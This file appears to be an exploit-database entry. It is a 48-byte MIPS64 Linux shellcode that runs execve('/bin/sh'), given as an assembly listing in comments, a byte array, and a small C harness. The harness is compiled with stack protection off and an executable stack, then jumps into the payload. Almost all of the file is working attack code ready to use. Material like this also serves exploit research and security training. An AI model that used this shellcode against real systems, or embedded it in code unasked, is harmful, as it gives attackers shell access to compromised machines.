/* Title: Linux/MIPS64 - execve(/bin/sh) Shellcode (48 bytes)
 * Date: 2018-08-10
 * Author: Antonio
 *
 * [*] execve(/bin/sh) shellcode for MIPS64
 * [*] tested on MIPS Malta - Linux debian-mips64el 4.9.0-3-5kc-malta
 * [*] 48 bytes
 *
 * gcc -fno-stack-protector -z execstack main.c -o main -g
 *
 * adp, SLAE - 1326, 2018.
 */

#include <stdio.h>
#include <string.h>

/*
.text
        .global __start
__start:
        dli     $t0,0x69622f2f
        sw      $t0,-12($sp)
        dli     $t1,0x68732f6e
        sw      $t1,-8($sp)
        sw      $zero,-4($sp)
        daddiu $a0,$sp,-12
        slti    $a1,$zero,-1
        slti    $a2,$zero,-1
        dli      $v0,     5057
        syscall   0x40404
.align 8
*/

unsigned char shellcode[] =
      "\x62\x69\x0c\x3c"
      "\x2f\x2f\x8c\x35"
      "\xf4\xff\xac\xaf"
      "\x73\x68\x0d\x3c"
      "\x6e\x2f\xad\x35"
      "\xf8\xff\xad\xaf"
      "\xfc\xff\xa0\xaf"
      "\xf4\xff\xa4\x67"
      "\xff\xff\x05\x28"
      "\xff\xff\x06\x28"
      "\xc1\x13\x02\x24"
      "\x0c\x01\x01\x01";

int main(int argc, char ** argv)
{
        void (*s) (void);

        printf("Shellshellcode Length:  %d\n", strlen(shellcode));

        s = shellcode;
        s();
}